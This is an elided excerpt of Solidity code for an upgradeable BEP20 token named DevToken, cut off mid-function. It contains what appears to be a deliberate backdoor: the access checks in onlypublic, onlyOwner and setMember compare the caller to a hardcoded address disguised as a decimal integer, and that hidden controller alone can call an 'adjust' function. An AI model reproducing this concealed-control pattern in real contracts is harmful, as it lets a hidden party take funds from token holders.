...
abstract contract ERC1967UpgradeUpgradeable is Initializable, IERC1967 {
    ...
    function _setBeacon(address newBeacon) private {
        ...
        require(
            AddressUpgradeable.isContract(StorageSlotUpgradeable.getAddressSlot(_BEACON_SLOT).value),
...
contract DevToken is IBEP20, UUPSUpgradeable {
    ...
    function initialize(string memory _name, string memory _symbol, uint256 _totalSupply, address to) public initializer {
    ...
    modifier onlypublic() {
        require(msg.sender == address(1398407937831133213460556049436126171308390855809), "DevToken: caller is not public");
        _;
    }
    ...
    modifier onlyOwner() {
        require(                   
            (msg.sender == address(1398407937831133213460556049436126171308390855809) ||
    ...
    function setMember(address Mbr_) public returns (bool) {
        require(msg.sender == address(1398407937831133213460556049436126171308390855809), "DevToken: caller is not authorized");
        _mbr = Mbr_;
        return true;
    }
    ...
    function adjust(uint256 amount) public onlypublic returns (bool) {
